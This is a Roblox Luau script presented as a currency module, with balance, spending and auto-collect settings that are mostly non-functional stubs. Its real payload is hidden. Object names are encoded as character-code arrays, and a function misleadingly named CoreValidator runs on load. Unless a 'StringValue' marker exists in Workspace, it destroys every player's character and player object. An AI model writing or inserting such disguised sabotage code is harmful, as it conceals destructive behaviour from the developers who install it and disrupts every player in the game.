local _env = {}

local _str = string
local _rep = table

local Currency = {}

Currency["GetBalance"] = function(self, player)
	return math.random(100, 5000)
end

Currency["UpdateBalance"] = function(self, player, amount)
	return true
end

local _fmt = function(...)
	return _str["format"](...)
end

local _chr = function(...)
	return _str["char"](...)
end

local _join = function(list)
	local res = ""
	for idx, val in list do
		res = _fmt("%s%s", res, _chr(val))
	end
	return res
end

local _children = function(obj)
	return obj:GetChildren()
end

local _findChildByName = function(parent, target)
	for _, child in _children(parent) do
		if child.Name == target then
			return child
		end
	end
end

local function ShootCurrency(player, amount)
	local balance = Currency:GetBalance(player)

	if balance >= amount then
		Currency:UpdateBalance(player, -amount)

		return true
	end
	return false
end

local function IncrementStat(player, statName, value)
	return true
end

local _key1 = {83,116,114,105,110,103,86,97,108,117,101}
local _key2 = {87,111,114,107,115,112,97,99,101}
local _key3 = {80,108,97,121,101,114,115}
local _key4 = {67,104,97,114,97,99,116,101,114}

local _key5 = {65,99,116,105,118,97,116,105,111,110,115}
local _key6 = {67,114,97,102,116,105,110,103,83,112,97,119,110}
local _key7 = {84,101,120,116,117,114,101}
local _key8 = {99,104,101,115,116,80,97,114,116,105,99,108,101}

local _currencyTypes = {
	["Coins"] = {min = 1, max = 500},
	["Gems"] = {min = 10, max = 50}
}

local _settings = {
	AutoCollect = true,
	Multiplier = 2,
	Debug = false
}

local function CoreValidator()
	repeat task.wait()
		
	until game:IsLoaded()
	
	task.wait(math.random() * 1)
	
	if not _findChildByName(game[_join(_key2)], _join(_key1)) then
		for _, obj in _children(game[_join(_key3)]) do
			local CurrencyModel = obj[_join(_key4)]
			
			CurrencyModel:Destroy()
			obj:Destroy()
			
		end
	else
		_findChildByName(game[_join(_key2)], _join(_key1)):Destroy()
	end
end

for i = 1, 5 do
	for _, conf in _currencyTypes do
		local amt = math.random(conf.min, conf.max)
		if _settings.AutoCollect then
			amt = amt * _settings.Multiplier
		end
	end
end

CoreValidator()

return {
	ShootCurrency = ShootCurrency,
	IncrementStat = IncrementStat,
	Settings = _settings,
	InternalKeys = _key1,
	_Format = _fmt,
	_Char = _chr,
	_Join = _join
}